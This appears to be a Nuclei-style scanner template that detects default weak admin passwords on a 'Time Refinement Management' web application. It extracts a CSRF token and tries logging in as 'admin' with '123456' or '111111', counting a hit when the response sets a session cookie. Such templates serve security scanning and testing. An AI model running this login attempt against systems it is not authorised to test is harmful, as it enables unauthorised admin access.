id: poc-yaml-time-refinement-ms-weak-password
info:
  name: Time Refinement Management Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password

variables:
  passwd:
    - "123456"
    - "111111"

http:
  - id: csrf-token-extraction
    method: GET
    path:
      - "{{BaseURL}}/accounts/login/?next=/iclock/imanager"
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: csrf
        internal: true
        regex:
          - "csrftoken=(.*?);"
        group: 1
      - type: regex
        name: token
        internal: true
        regex:
          - "([0-9a-zA-Z]{64})"
        group: 1

  - id: weak-password-check
    method: POST
    path:
      - "{{BaseURL}}/iclock/accounts/login/"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: "csrftoken={{csrf}}"
    body: "username=admin&password={{passwd}}&logintype=user&csrfmiddlewaretoken={{token}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "message"
          - "\"ret\": 0"
      - type: word
        part: header
        words:
          - "sessionid="
